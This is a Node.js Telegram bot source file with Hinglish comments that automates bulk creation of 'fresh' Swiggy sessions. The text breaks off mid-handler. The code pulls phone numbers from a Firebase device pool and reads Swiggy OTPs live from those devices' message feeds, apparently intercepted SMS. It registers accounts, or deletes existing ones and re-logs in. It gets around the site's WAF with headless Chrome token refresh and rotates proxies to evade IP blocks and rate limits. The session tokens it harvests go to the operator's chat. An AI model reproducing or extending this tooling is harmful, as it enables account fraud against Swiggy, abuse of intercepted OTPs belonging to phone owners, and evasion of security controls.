// ===== 🆕 SWIGGY FRESH BOT — ek START, baaki sab khud =====
//
// Ye STANDALONE bot hai (alag project, alag DB):
//   /start → ▶️ START BATCH · ⏹ STOP · 📊 STATUS · ⚙️ SETTINGS
//
// Ek START ke baad ye apne aap chalta hai:
//   1️⃣ Firebase pool (clients/) se number uthata — online devices pehle
//   2️⃣ Swiggy OTP bhejta hai → isi Firebase (messages/) se live poll karke
//      OTP padh kar khud paste karta hai
//   3️⃣ 🆕 naya number = register + session save
//      ♻️ purana number = login → delete account → usi number se fresh login
//   4️⃣ charges/order/wallet block = SKIP · rate-limit = auto backoff ·
//      WAF challenge = auto token-refresh + retry (batch nahi rukta) ·
//      STOP dabane par ruk jata hai
//
// ⚙️ SETTINGS — user ki azadi (env chhedni ki zaroorat nahi):
//   • 🔥 Firebase Sources — multiple DB add/remove/enable/switch (bot UI se)
//   • 🎯 Target / ⏱ Max time / 🚦 Gap / ⏳ OTP wait — sab yahin se
//
// Setup (sirf 2 cheezein):
//   .env → BOT_TOKEN=<BotFather ka token>   (AUTOPILOT_BOT_TOKEN bhi chalega)
//          OWNER_IDS=<aapka Telegram id>    (warna store boss + fallback)
//   FIREBASE_DB_URL ki zaroorat NAHI — default hi vuvhbjbi Firebase hai.
//
// Chalao:  node fresh-bot.js   (ya npm start)

import dotenv from 'dotenv';
dotenv.config();

// OTP + numbers dono ISI Firebase se aate hain (premium/firebase koi third source nahi)
process.env.FIREBASE_DB_URL ||= 'https://vuvhbjbi-default-rtdb.firebaseio.com/';

// Dynamic import — defaults set karne KE BAAD hi modules load ho, warna
// firebase-numbers.js env ko call-time par hi padhta hai, phir bhi safe side.
const { Telegraf } = await import('telegraf');
const { isBoss, hydrateAccountsFromCloudVault, getSessionExportJson } = await import('./store.js');
const {
  startAutopilot,
  requestAutopilotStop,
  getAutopilotSnapshot,
  isAutopilotRunning,
} = await import('./autopilot-engine.js');
const { isFirebaseConfigured, firebaseSetupHintLines, listPoolNumbers } = await import('./firebase-numbers.js');
const sources = await import('./firebase-sources.js');
const bs = await import('./bot-settings.js');
const proxyPool = await import('./proxy-pool.js');
const { getChromeStatus } = await import('./swiggy-bridge.js');
const wafPool = await import('./waf-pool.js');
const { esc, section, sub, field } = await import('./rich-text.js');

// ---------------------------------------------------------------------------
// Process guards — ek stray async error poore bot ko NA maare.
// (Pehle: koi bhi unhandled rejection/handler error = process band, aur
// user ko sirf "bot work nahi kar raha" dikhta tha, wajah kabhi nahi.)
// ---------------------------------------------------------------------------
process.on('unhandledRejection', (err) => {
  console.error('[FreshBot] unhandledRejection (bot chalta rahega):', err?.stack || err?.message || err);
});
process.on('uncaughtException', (err) => {
  console.error('[FreshBot] uncaughtException (bot chalta rahega):', err?.stack || err?.message || err);
});

// ---------------------------------------------------------------------------
// Config + owner gate
// ---------------------------------------------------------------------------
const TOKEN = String(process.env.BOT_TOKEN || process.env.AUTOPILOT_BOT_TOKEN || '').trim();

function ownerIds() {
  const raw = String(process.env.OWNER_IDS || process.env.AUTOPILOT_OWNER_IDS || '')
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean);
  if (raw.length) return new Set(raw);
  return null; // fallback: store bossIds + known owner
}

function isOwner(userId) {
  const ids = ownerIds();
  const uid = String(userId);
  if (ids) return ids.has(uid);
  try { if (isBoss(Number(userId))) return true; } catch {}
  try { if (isBoss(uid)) return true; } catch {}
  return uid === '5393396812';
}

// ---------------------------------------------------------------------------
// Cards
// ---------------------------------------------------------------------------
const kb = (rows) => ({ parse_mode: 'HTML', link_preview_options: { is_disabled: true }, reply_markup: { inline_keyboard: rows } });

function fmtDuration(ms) {
  const s = Math.max(0, Math.floor(ms / 1000));
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (h) return `${h}h ${m}m`;
  if (m) return `${m}m ${sec}s`;
  return `${sec}s`;
}

function activeSourceLine() {
  try {
    const src = sources.getActiveSource();
    if (!src) return field('🔥 Firebase', '— (koi source nahi)');
    const list = sources.listSources();
    return field('🔥 Firebase', `${esc(src.name)}  ·  ${list.length} source${list.length === 1 ? '' : 's'}`);
  } catch {
    return field('🔥 Firebase', '—');
  }
}

function startCard() {
  const snap = getAutopilotSnapshot();
  const target = bs.getSetting('target');
  const maxMin = bs.getSetting('maxMinutes');
  return section('🆕 Swiggy Fresh Bot', [
    `Bas <b>START</b> dabao — phone pe chhod ke aa jao,`,
    `baaki sab ye khud karega:`,
    ``,
    `1️⃣ Firebase pool se number (online pehle)`,
    `2️⃣ Swiggy OTP → <b>live inbox poll</b> → OTP khud padh kar paste`,
    `3️⃣ 🆕 naya = register · ♻️ purana = delete → fresh login`,
    `4️⃣ charges/order/wallet block = <b>SKIP</b> · WAF = <b>auto token-refresh + retry</b>`,
    ``,
    activeSourceLine(),
    field('🎯 Target', `${target} fresh sessions`),
    field('⏱ Max time', `${maxMin} minutes`),
    snap.finishedAt
      ? field('Last run', `${snap.fresh} fresh · ${fmtDuration(snap.elapsedMs)} · ${esc(snap.stopReason || 'done')}`)
      : '',
    ``,
    isAutopilotRunning()
      ? `● <b>RUNNING</b> — STOP/STATUS niche.`
      : sub('Start karke chhod do — ~1 hr baad aakar summary dekh lena.'),
  ].filter(Boolean).join('\n'));
}

function runningCard(snap, stageText = '') {
  return section('● Autopilot RUNNING', [
    field('Runtime', fmtDuration(snap.elapsedMs)),
    field('Target', String(snap.target)),
    stageText || '',
    ``,
    field('Processed', String(snap.processed)),
    field('✅ Fresh', `${snap.fresh}  (naye: ${snap.freshNew} · delete+fresh: ${snap.freshAfterDelete})`),
    field('⚠️ Skipped', `${snap.skipped} · deferred: ${snap.deferred} · 📴 stale devices: ${snap.staleSkips || 0}`),
    field('× Failed', `${snap.failed} · rate-limit: ${snap.rateStrikes}`),
    field('Pool', snap.poolTotal ? `${snap.poolFresh} fresh / ${snap.poolTotal} numbers` : 'load ho raha hai…'),
    (snap.scanning || snap.scanChecked)
      ? field('🔎 Device scan', `${snap.scanChecked || 0} check · ${snap.scanFresh || 0} fresh ready${snap.scanning ? ' · scanning…' : ''}`)
      : '',
    snap.current
      ? `📍 <b>Abhi:</b> <code>${esc(snap.current.phone)}</code> (${fmtDuration(Date.now() - snap.current.startedAt)})`
      : (snap.scanning ? '🔎 Zinda devices dhoondh raha hoon (parallel scan)…' : ''),
    snap.lastError ? field('Last error', snap.lastError) : '',
  ].filter(Boolean).join('\n'));
}

function summaryCard(snap) {
  const freshList = (snap.freshAccounts || []).slice(-12)
    .map((a) => `• <code>${esc(a.phone)}</code> → <b>${esc(a.accountKey)}</b>`)
    .join('\n');
  return section('📊 Batch — Final Summary', [
    field('Status', snap.running ? '● RUNNING' : `⏹ ${esc(snap.stopReason || 'stopped')}`),
    field('Runtime', fmtDuration(snap.elapsedMs)),
    ``,
    field('Processed', String(snap.processed)),
    field('✅ Fresh', `${snap.fresh}  (naye: ${snap.freshNew} · delete+fresh: ${snap.freshAfterDelete})`),
    field('⚠️ Skipped', `${snap.skipped} · deferred: ${snap.deferred} · 📴 stale devices: ${snap.staleSkips || 0}`),
    field('× Failed', `${snap.failed} · rate-limit: ${snap.rateStrikes}`),
    field('Pool', `${snap.poolFresh} fresh / ${snap.poolTotal} numbers`),
    snap.scanChecked ? field('🔎 Devices check kiye', String(snap.scanChecked)) : '',
    snap.lastError ? field('Last error', snap.lastError) : '',
    freshList ? `` : '',
    freshList ? `▤ <b>Latest fresh sessions:</b>` : '',
    freshList || sub('Abhi tak koi fresh session nahi bana.'),
    ``,
    sub('Har fresh session ka JSON chat me file bana kar bhej diya gaya hai (data/db.json + cloud vault me bhi saved).'),
  ].filter((x) => x !== '' && x !== false).join('\n'));
}

const startRows = () => [
  [{ text: '▶️ START BATCH', callback_data: 'ap_start', style: 'success' }],
  [{ text: '📊 Status', callback_data: 'ap_status' }, { text: '⚙️ Settings', callback_data: 'ap_settings' }],
];
const stopRows = () => [
  [{ text: '⏹ STOP BATCH', callback_data: 'ap_stop', style: 'danger' }],
  [{ text: '📊 Status', callback_data: 'ap_status' }, { text: '⚙️ Settings', callback_data: 'ap_settings' }],
];
const idleRows = () => [
  [{ text: '▶️ START BATCH', callback_data: 'ap_start', style: 'success' }],
  [{ text: '📊 Status', callback_data: 'ap_status' }, { text: '⚙️ Settings', callback_data: 'ap_settings' }],
];

// ---------------------------------------------------------------------------
// ⚙️ SETTINGS — Firebase sources + batch knobs (user ki azadi, env nahi)
// ---------------------------------------------------------------------------
function settingsCard() {
  const ps = proxyPool.proxySummary();
  return section('⚙️ Settings', [
    activeSourceLine(),
    field('🔀 Proxies', ps.enabled ? `${ps.enabledCount}/${ps.total} ON — ${ps.rotation}` : 'OFF (rukna pad sakta hai)'),
    ``,
    field('🎯 Target', `${bs.getSetting('target')} fresh`),
    field('⏱ Max time', `${bs.getSetting('maxMinutes')} min`),
    field('🚦 Gap', bs.fmtSetting('gapMs')),
    field('⏳ OTP wait', bs.fmtSetting('otpWaitMs')),
    field('📴 Offline devices', bs.getSetting('allowOffline') ? 'ON (try bhi karenge)' : 'OFF (sirf online)'),
    ``,
    sub('Sab kuch yahin se badlo — .env chhedni ki zaroorat nahi.'),
  ].join('\n'));
}

const settingsRows = () => [
  [{ text: '🔥 Firebase Sources', callback_data: 'ap_sources', style: 'primary' }],
  [{ text: `🔀 Proxies: ${proxyPool.proxySummary().enabledCount}`, callback_data: 'ap_proxies', style: 'primary' }],
  [{ text: `🎯 Target: ${bs.getSetting('target')}`, callback_data: 'ap_pick_target' }],
  [{ text: `⏱ Max: ${bs.getSetting('maxMinutes')}m`, callback_data: 'ap_pick_time' }],
  [{ text: `🚦 Gap: ${bs.fmtSetting('gapMs')}`, callback_data: 'ap_pick_gap' }],
  [{ text: `📴 Offline: ${bs.getSetting('allowOffline') ? 'ON' : 'OFF'}`, callback_data: 'ap_toggle_offline' }],
  [{ text: '🩺 Diagnose (kya toota hai?)', callback_data: 'ap_diag' }],
  [{ text: '↩️ Back', callback_data: 'ap_home', style: 'primary' }],
];

// ---------------------------------------------------------------------------
// 🔀 PROXIES — "rukna hi na pare" ka tod. Multiple proxies = multiple IPs.
//   Ek IP blocked → bot TURANT doosri IP (zero wait).
// ---------------------------------------------------------------------------
function proxiesCard() {
  const list = proxyPool.listProxies();
  const ps = proxyPool.proxySummary();
  const rows = list.map((p) => [
    {
      text: `${p.enabled ? (p.cooldownLeftMs > 0 ? '🟡' : '▫️') : '🚫'} ${p.label}${p.tokenReady ? ' 🔑' : ''}`,
      callback_data: `ap_px_${p.id}`,
    },
  ]);
  rows.push([{ text: '🌐 Free Proxies Lao (auto)', callback_data: 'ap_px_free', style: 'success' }]);
  rows.push([{ text: '➕ Add Proxy (khud ki)', callback_data: 'ap_px_add' }]);
  rows.push([{ text: `🌐 Free Auto: ${ps.autoFree ? 'ON' : 'OFF'}`, callback_data: 'ap_px_autotoggle' }]);
  rows.push([{ text: ps.enabled ? '⏸ Pause Rotation' : '▶️ Enable Rotation', callback_data: 'ap_px_rot' }]);
  rows.push([{ text: '↩️ Settings', callback_data: 'ap_settings', style: 'primary' }]);
  return {
    text: section('🔀 Proxy Pool — IP Rotation', [
      `Status: <b>${ps.enabled ? `ON (${ps.enabledCount}/${ps.total})` : 'OFF'}</b> — ${esc(ps.rotation)}`,
      `🌐 Free auto-fetch: <b>${ps.autoFree ? 'ON' : 'OFF'}</b>${ps.autoCount ? ` · ${ps.autoCount} auto proxies pool me` : ''}`,
      ``,
      list.length
        ? list.map((p) =>
            `${p.enabled ? (p.cooldownLeftMs > 0 ? `🟡 (${Math.ceil(p.cooldownLeftMs / 1000)}s)` : '▫️') : '🚫'} <b>${esc(p.label)}</b>${p.tokenReady ? ' 🔑' : ''} · hits: ${p.hits || 0}`
          ).join('\n')
        : sub('Koi proxy nahi — abhi sab kuch EK IP se ja raha hai (rukne ka khatra).'),
      ``,
      sub('🌐 dabao — bot free proxy list se la kar sirf Swiggy par zinda wali rakhega. Batch start par bhi auto ho jata hai. Ek IP blocked → bot turant doosri IP (ZERO wait).'),
    ].join('\n')),
    rows,
  };
}

function proxyDetailCard(pxId) {
  const p = proxyPool.listProxies().find((x) => x.id === pxId);
  if (!p) return { text: '❌ Proxy nahi mila.', rows: [[{ text: '↩️ Proxies', callback_data: 'ap_proxies' }]] };
  return {
    text: section(`🔀 ${esc(p.label)}`, [
      `URL: <code>${esc(p.url.replace(/\/\/[^@]*@/, '//***:***@'))}</code>`,
      `Status: ${p.enabled ? '▫️ enabled' : '🚫 disabled'}${p.cooldownLeftMs > 0 ? ` · 🟡 WAF cooldown ${Math.ceil(p.cooldownLeftMs / 1000)}s` : ''}`,
      p.auto ? `🌐 Free auto proxy${p.country ? ` · ${esc(p.country)}` : ''}${p.latencyMs ? ` · ⚡ ${p.latencyMs}ms (last check)` : ''} — marne par khud replace ho jayegi` : '',
      `WAF token: ${p.tokenReady ? '🔑 ready (per-proxy)' : '— (demand par banega)'}`,
      `Hits: ${p.hits || 0} · errors: ${p.consecutiveErrors || 0}`,
      ``,
      sub('Ye proxy OFF ho to bot seedha aapke IP se karega (ruk sakta hai).'),
    ].join('\n')),
    rows: [
      [{ text: p.enabled ? '🚫 Disable' : '▫️ Enable', callback_data: `ap_px_toggle_${p.id}` }],
      [{ text: '🗑 Delete', callback_data: `ap_px_del_${p.id}`, style: 'danger' }],
      [{ text: '↩️ Proxies', callback_data: 'ap_proxies', style: 'primary' }],
    ],
  };
}

function sourcesCard() {
  const list = sources.listSources();
  const rows = list.map((s) => [
    {
      text: `${s.active ? '✅' : (s.enabled ? '▫️' : '🚫')} ${s.name}${s.active ? ' (ACTIVE)' : ''}`,
      callback_data: `ap_src_${s.id}`,
    },
  ]);
  rows.push([{ text: '➕ Add Firebase', callback_data: 'ap_src_add', style: 'success' }]);
  rows.push([{ text: '↩️ Settings', callback_data: 'ap_settings', style: 'primary' }]);
  return {
    text: section('🔥 Firebase Sources', [
      `Aap jitne chahein Firebase DB add kar sakte hain — numbers + OTP`,
      `usi se aayega jo ACTIVE hai.`,
      ``,
      ...list.map((s) =>
        `${s.active ? '✅' : (s.enabled ? '▫️' : '🚫')} <b>${esc(s.name)}</b> — <code>${esc(s.url.replace('https://', ''))}</code>${s.auth ? ' 🔑' : ''}`
      ),
      ``,
      sub('Source tap karke: switch / verify / enable-disable / delete.'),
    ].join('\n')),
    rows,
  };
}

function sourceDetailCard(srcId) {
  const s = sources.getSource(srcId);
  if (!s) return { text: '❌ Source nahi mila.', rows: [[{ text: '↩️ Sources', callback_data: 'ap_sources' }]] };
  return {
    text: section(`🔥 ${esc(s.name)}`, [
      `URL: <code>${esc(s.url)}</code>`,
      s.auth ? 'Auth: 🔑 set hai' : 'Auth: nahi (open rules)',
      `Paths: clients=<code>${esc(s.clientsPath)}</code> · messages=<code>${esc(s.messagesPath)}</code>`,
      `Status: ${s.enabled ? '▫️ enabled' : '🚫 disabled'}${s.active ? ' · <b>ACTIVE</b>' : ''}`,
      ``,
      sub('Verify = test ki DB reachable hai (shallow root read).'),
    ].join('\n')),
    rows: [
      [
        { text: '✅ Use this', callback_data: `ap_src_use_${s.id}`, style: 'success' },
        { text: s.enabled ? '🚫 Disable' : '▫️ Enable', callback_data: `ap_src_toggle_${s.id}` },
      ],
      [{ text: '🧪 Verify', callback_data: `ap_src_verify_${s.id}` }],
      [{ text: '🗑 Delete', callback_data: `ap_src_del_${s.id}`, style: 'danger' }],
      [{ text: '↩️ Sources', callback_data: 'ap_sources', style: 'primary' }],
    ],
  };
}

const pickRows = (prefix, opts, extra = []) => [
  opts.map((o) => ({ text: String(o.label), callback_data: `${prefix}${o.v}` })),
  ...extra,
  [{ text: '↩️ Settings', callback_data: 'ap_settings', style: 'primary' }],
];

const TARGET_PRESETS = [10, 25, 50, 100, 200, 500].map((v) => ({ label: `${v}`, v }));
const TIME_PRESETS = [15, 30, 60, 120, 240, 480].map((v) => ({ label: `${v}m`, v }));
const GAP_PRESETS = [
  { label: '0s', v: 0 }, { label: '5s', v: 5000 }, { label: '15s', v: 15000 },
  { label: '30s', v: 30000 }, { label: '60s', v: 60000 },
];

// ---------------------------------------------------------------------------
// Boot
// ---------------------------------------------------------------------------
if (!TOKEN) {
  console.error('❌ BOT_TOKEN nahi mila. .env me daalo:  BOT_TOKEN=<BotFather token>');
  process.exit(1);
}

// handlerTimeout: 0 GHALT tha — Telegraf me 0 = "0ms me timeout" (har handler
// turant maar jaata tha). Default 90s rakhte hain; batch background me chalta
// hai isliye handlers fast hi rehte hain.
const bot = new Telegraf(TOKEN);

// ⚠️ SABSE BADA FIX: pehle bot.catch hi nahi tha. Telegraf ka default error
// handler error ko WAPAS throw karta hai → polling loop reject →
// bot.launch() reject → process.exit(1). Matlab EK bhi handler me kahin
// chhota sa error (message edit fail, Firebase slow, kuch bhi) = POORA BOT
// BAND. Ab error log hoga, bot chalta rahega.
bot.catch((err, ctx) => {
  console.error(`[FreshBot] handler error (update ${ctx?.update?.update_id ?? '?'}):`, err?.stack || err?.message || err);
  // User ko bhi bata do ke kuch gadbad hui (chup rehne se "bot dead hai" lagta hai).
  // try/catch zaroori hai: message-update par answerCbQuery sync throw karta
  // hai — error-handler khud throw kare to bot wapas marr jayega.
  try { ctx?.reply?.('⚠️ Ek error aayi hai — console me details hain. /start dubara dabao, bot chal raha hai.')?.catch?.(() => {}); } catch {}
  try { ctx?.answerCbQuery?.('⚠️ Error — /start dubara dabao')?.catch?.(() => {}); } catch {}
});

const gate = async (ctx) => {
  const uid = ctx.from?.id;
  if (!isOwner(uid)) {
    await ctx.answerCbQuery?.('⛔ Sirf owner.', { show_alert: true }).catch(() => {});
    await ctx.reply(section('⛔ Ye bot sirf owner ke liye hai', [
      `Aapki Telegram ID: <code>${uid}</code>`,
      ``,
      sub('Is ID ko .env me OWNER_IDS me daalein aur bot restart karein:'),
      `<code>OWNER_IDS=${uid}</code>`,
    ].join('\n'))).catch(() => {});
    return false;
  }
  return true;
};

const sendLive = async (chatId, text, rows) => {
  await bot.telegram.sendMessage(chatId, text, kb(rows || idleRows())).catch((e) => {
    console.warn('[FreshBot] live send:', e?.message);
  });
};

async function launchBatch(ctx) {
  // Pehle yahan owner-gate tha hi nahi — koi bhi START daba kar batch chala
  // sakta tha (bot username janna hi kaafi tha).
  if (!(await gate(ctx))) return;
  if (isAutopilotRunning()) {
    await ctx.answerCbQuery('Pehle se chal raha hai!').catch(() => {});
    return;
  }
  if (!isFirebaseConfigured()) {
    await ctx.answerCbQuery('⚙️ Firebase config pending!', { show_alert: true }).catch(() => {});
    await ctx.reply(section('⚙️ Firebase Setup Pending', firebaseSetupHintLines().join('\n')),
      kb([[{ text: '🏠 Menu', callback_data: 'ap_home', style: 'primary' }]])).catch(() => {});
    return;
  }
  await ctx.answerCbQuery('🚀 Autopilot start…').catch(() => {});
  await ctx.editMessageText(startCard(), kb(stopRows())).catch(() => {});

  // Live card: pehle usi message ko edit karo (jo START par tha), warna naya message
  let lastText = '';
  let lastRowsKey = '';
  const fallback = { chatId: ctx.chat?.id, seq: 0 };
  const ui = {
    async update(text, rows) {
      const rowsKey = JSON.stringify(rows);
      if (text === lastText && rowsKey === lastRowsKey) return;
      lastText = text;
      lastRowsKey = rowsKey;
      try {
        await ctx.editMessageText(text, kb(rows));
      } catch (e) {
        const msg = String(e?.message || '');
        if (/message is not modified/i.test(msg)) return;
        // edit fail (purana message/delete) → naya message bhej do
        if (fallback.chatId) {
          fallback.seq += 1;
          await sendLive(fallback.chatId, text, rows);
        }
      }
    },

    // 📤 Fresh session bante HI uska JSON isi chat me FILE bana kar bhej do
    // (boss ki demand: "jaise koi bhi fresh JSON mile, same time par chat
    // me send karna hai"). Batch ka end/summary ka wait bilkul nahi.
    async sendSession({ phone, accountKey, kind, account } = {}) {
      const chatId = ctx.chat?.id || fallback.chatId;
      if (!chatId) return;
      const typeText = kind === 'fresh_after_delete' ? '♻️ Delete + Fresh' : '🆕 Naya Fresh';
      const caption = [
        `✅ <b>Fresh Session Ready</b> — ${typeText}`,
        `📱 <b>Number:</b> <code>${esc(phone || '')}</code>`,
        `👤 <b>Account:</b> <b>${esc(accountKey || '')}</b>`,
      ].join('\n');

      const exportData = getSessionExportJson(accountKey, account);
      if (!exportData) {
        await bot.telegram.sendMessage(chatId,
          `${caption}\n\n<i>(JSON export nahi mil paya — session bot DB me saved hai)</i>`,
          { parse_mode: 'HTML' }).catch(() => {});
        return;
      }

      const jsonText = JSON.stringify(exportData, null, 2);
      try {
        await bot.telegram.sendDocument(chatId,
          { source: Buffer.from(jsonText, 'utf8'), filename: `${phone || accountKey || 'session'}.json` },
          { caption, parse_mode: 'HTML' });
      } catch (e) {
        console.warn('[FreshBot] session file send:', e?.message);
        // File send fail → code block me bhej do (Telegram limit ke andar ho to)
        const body = jsonText.length <= 3400
          ? `${caption}\n\n<pre>${esc(jsonText)}</pre>`
          : `${caption}\n\n<i>(JSON file send fail hua — session bot DB me saved hai)</i>`;
        await bot.telegram.sendMessage(chatId, body, { parse_mode: 'HTML' }).catch(() => {});
      }
    },
  };

  startAutopilot({
    userId: String(ctx.from.id),
    ui,
  }).catch((e) => console.error('[FreshBot] autopilot:', e?.stack || e?.message));
}

bot.start(async (ctx) => {
  if (!isOwner(ctx.from?.id)) {
    return ctx.reply(section('⛔ Ye bot sirf owner ke liye hai', [
      `Aapki Telegram ID: <code>${ctx.from?.id}</code>`,
      ``,
      sub('Bot band karke .env me ye line daalein:'),
      `<code>OWNER_IDS=${ctx.from?.id}</code>`,
      ``,
      sub('Phir dobara chalayein (npm start) aur /start dabayein.'),
    ].join('\n'))).catch(() => {});
  }
  await ctx.reply(startCard(), kb(isAutopilotRunning() ? stopRows() : startRows())).catch(() => {});
});

bot.help((ctx) => ctx.reply('/start — menu · /status — current batch · /diag — kya toota hai, check karo', { parse_mode: 'HTML' }).catch(() => {}));

// ---------------------------------------------------------------------------
// 🩺 /diag — "bot work nahi kar raha" ka jawab ek tap me.
// Firebase reachable? Pool me numbers? Chrome mila? WAF token? Sab check.
// ---------------------------------------------------------------------------
async function diagCard() {
  const lines = [];
  lines.push(field('Node', process.version));
  // Chrome (WAF solver ke liye zaroori)
  try {
    const c = getChromeStatus();
    lines.push(field('🌐 Chrome', c.found ? `✅ mila — <code>${esc(c.path)}</code>${c.headless ? ' (headless)' : ''}` : '❌ NAHI mila — Chrome install karo ya .env me PUPPETEER_EXECUTABLE_PATH do'));
  } catch { lines.push(field('🌐 Chrome', '—')); }
  // WAF token
  try {
    wafPool.loadFromDb?.(); // db.json me saved token bhi dikhe (warna hamesha "nahi hai" lagega)
    const w = wafPool.getSummary();
    lines.push(field('🛡 WAF token', w.hasToken ? `✅ hai (age ${w.tokenAgeMin}m, ${esc(w.source)})` : (w.stale ? '⚠️ purana/expired — batch start par naya banega (Chrome chahiye)' : '— abhi nahi (batch start par banega)')));
  } catch { lines.push(field('🛡 WAF token', '—')); }
  // Firebase (active source verify = shallow root read, halka test)
  try {
    const src = sources.getActiveSource();
    if (src) {
      const t0 = Date.now();
      const v = await sources.verifySource(src.id);
      lines.push(field('🔥 Firebase', v.ok
        ? `✅ reachable ${Date.now() - t0}ms — ${esc(src.name)}`
        : `❌ ${esc(v.error || 'unreachable')} — URL/auth/rules check karo`));
    } else {
      lines.push(field('🔥 Firebase', '❌ koi active source nahi (⚙️ Settings → Firebase Sources)'));
    }
  } catch (e) { lines.push(field('🔥 Firebase', `❌ ${esc(String(e?.message || e).slice(0, 120))}`)); }
  // Pool count (asli test — thoda slow ho sakta hai, isliye alag try)
  try {
    sources.applyActiveSource();
    const pool = await listPoolNumbers();
    const online = pool.filter((p) => p.online !== false).length;
    lines.push(field('📱 Number pool', pool.length ? `✅ ${pool.length} numbers (${online} online)` : '❌ 0 numbers mile — Firebase clients/ node khali ya paths galat'));
  } catch (e) { lines.push(field('📱 Number pool', `❌ ${esc(String(e?.message || e).slice(0, 140))}`)); }
  // Device last-seen gate
  {
    const w = Number(process.env.PREMIUM_DEVICE_ACTIVE_WINDOW_MS);
    const wMs = Number.isFinite(w) && w > 0 ? w : 60_000;
    lines.push(field('📟 Device gate', `sirf wahi devices jinki last activity ≤${Math.round(wMs / 1000)}s purani ho (env PREMIUM_DEVICE_ACTIVE_WINDOW_MS se badal sakta hai)`));
  }
  // Proxies
  try {
    const ps = proxyPool.proxySummary();
    lines.push(field('🔀 Proxies', ps.enabled ? `✅ ${ps.enabledCount}/${ps.total} ON` : '⚠️ OFF (ek hi IP — rukna pad sakta hai)'));
  } catch { lines.push(field('🔀 Proxies', '—')); }
  const snap = getAutopilotSnapshot();
  lines.push(field('▶️ Batch', snap.running ? `● RUNNING — ${snap.fresh}/${snap.target} fresh` : (snap.finishedAt ? `⏹ last: ${snap.fresh} fresh · ${esc(snap.stopReason || 'done')}${snap.lastError ? ` · last error: ${esc(String(snap.lastError).slice(0, 100))}` : ''}` : 'ready')));
  return section('🩺 Diagnose — kya toota hai?', [
    ...lines,
    '',
    sub('Jahan ❌ hai wahi problem hai. Sab ✅ ho aur phir bhi batch fail ho to console logs dekho — har number ka exact reason wahan likhta hai.'),
  ].join('\n'));
}

bot.command('diag', async (ctx) => {
  if (!isOwner(ctx.from?.id)) return;
  const wait = await ctx.reply('🩺 Check kar raha hoon… (pool test me ~15s lag sakta hai)').catch(() => null);
  const text = await diagCard();
  if (wait) {
    await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, text, kb(idleRows())).catch(async () => {
      await ctx.reply(text, kb(idleRows())).catch(() => {});
    });
  } else {
    await ctx.reply(text, kb(idleRows())).catch(() => {});
  }
});

bot.command('status', async (ctx) => {
  if (!isOwner(ctx.from?.id)) return;
  const snap = getAutopilotSnapshot();
  await ctx.reply(snap.running || snap.finishedAt ? summaryCard(snap) : startCard(),
    kb(snap.running ? stopRows() : idleRows())).catch(() => {});
});

bot.action('ap_start', launchBatch);
// Engine ke rows premium callback names bhi bhejta hai — same kaam, same handler
bot.action('prem_batch_start', launchBatch);

bot.action('ap_stop', async (ctx) => {
  if (!(await gate(ctx))) return;
  const stopped = requestAutopilotStop('manual');
  await ctx.answerCbQuery(stopped ? '⏹ STOP signal bhej diya…' : 'Kuch chal nahi raha.').catch(() => {});
  if (stopped) await ctx.editMessageText('⏹ <b>Stop ho raha hai…</b> current number complete hoke ruk jayega.', kb(idleRows())).catch(() => {});
});
bot.action('prem_batch_stop', async (ctx) => {
  if (!(await gate(ctx))) return;
  const stopped = requestAutopilotStop('manual');
  await ctx.answerCbQuery(stopped ? '⏹ STOP signal bhej diya…' : 'Kuch chal nahi raha.').catch(() => {});
});

bot.action('ap_status', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  const snap = getAutopilotSnapshot();
  const text = snap.running ? runningCard(snap) : (snap.finishedAt ? summaryCard(snap) : startCard());
  await ctx.editMessageText(text, kb(snap.running ? stopRows() : idleRows()))
    .catch(async () => { await ctx.reply(text, kb(snap.running ? stopRows() : idleRows())).catch(() => {}); });
});
bot.action('prem_batch_status', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  const snap = getAutopilotSnapshot();
  const text = snap.running ? runningCard(snap) : (snap.finishedAt ? summaryCard(snap) : startCard());
  await ctx.reply(text, kb(snap.running ? stopRows() : idleRows())).catch(() => {});
});

// Engine ke rows me Main Menu / Get Number buttons bhi aate hain — yahan bas menu dikhao
bot.action('ap_home', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  const text = startCard();
  await ctx.editMessageText(text, kb(isAutopilotRunning() ? stopRows() : startRows()))
    .catch(async () => { await ctx.reply(text, kb(isAutopilotRunning() ? stopRows() : startRows())).catch(() => {}); });
});
bot.action(['boss_panel_home', 'prem_get_number'], async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery('Is bot me sirf BATCH hai — START dabao. ✅', { show_alert: false }).catch(() => {});
  const text = startCard();
  await ctx.editMessageText(text, kb(isAutopilotRunning() ? stopRows() : startRows()))
    .catch(async () => { await ctx.reply(text, kb(isAutopilotRunning() ? stopRows() : startRows())).catch(() => {}); });
});

// ---------------------------------------------------------------------------
// ⚙️ Settings handlers — sources + knobs (kuch bhi text-input wait-state me)
// ---------------------------------------------------------------------------
const pending = new Map(); // uid → { action, srcId? } — text input ka wait-state

const editOrSend = async (ctx, text, rows) => {
  await ctx.editMessageText(text, kb(rows))
    .catch(async () => { await ctx.reply(text, kb(rows)).catch(() => {}); });
};

bot.action('ap_settings', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  await editOrSend(ctx, settingsCard(), settingsRows());
});

bot.action('ap_diag', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery('🩺 Checking…').catch(() => {});
  await editOrSend(ctx, '🩺 Check kar raha hoon… (pool test me ~15s lag sakta hai)', [[{ text: '↩️ Settings', callback_data: 'ap_settings', style: 'primary' }]]);
  const text = await diagCard();
  await editOrSend(ctx, text, [[{ text: '↩️ Settings', callback_data: 'ap_settings', style: 'primary' }]]);
});

bot.action('ap_sources', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  const { text, rows } = sourcesCard();
  await editOrSend(ctx, text, rows);
});

// Source detail — regex har naye source id tak match karega
bot.action(/^ap_src_(?!add$)([a-f0-9-]{1,10})$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  const { text, rows } = sourceDetailCard(ctx.match[1]);
  await editOrSend(ctx, text, rows);
});

bot.action(/^ap_src_use_([a-f0-9-]{1,10})$/, async (ctx) => {
